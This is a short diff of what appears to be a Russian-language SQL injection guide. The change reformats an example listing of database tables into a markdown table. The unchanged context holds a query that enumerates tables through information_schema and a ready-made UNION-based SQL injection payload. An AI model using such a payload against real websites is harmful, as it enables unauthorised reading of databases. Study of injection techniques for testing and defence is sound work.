@@ -88,10 +88,11 @@ Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 1439
 - SELECT * FROM information_schema.tables
 
 #### Пример результата:
-TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	TABLE_TYPE
-MyDatabase	dbo	Products	BASE TABLE
-MyDatabase	dbo	Users	BASE TABLE
-MyDatabase	dbo	Feedback	BASE TABLE
+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
+|---------------|--------------|------------|------------|
+| MyDatabase    | dbo          | Products   | BASE TABLE |
+| MyDatabase    | dbo          | Users      | BASE TABLE |
+| MyDatabase    | dbo          | Feedback   | BASE TABLE |
 
 ### Готовый payload для UNION-атаки:
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
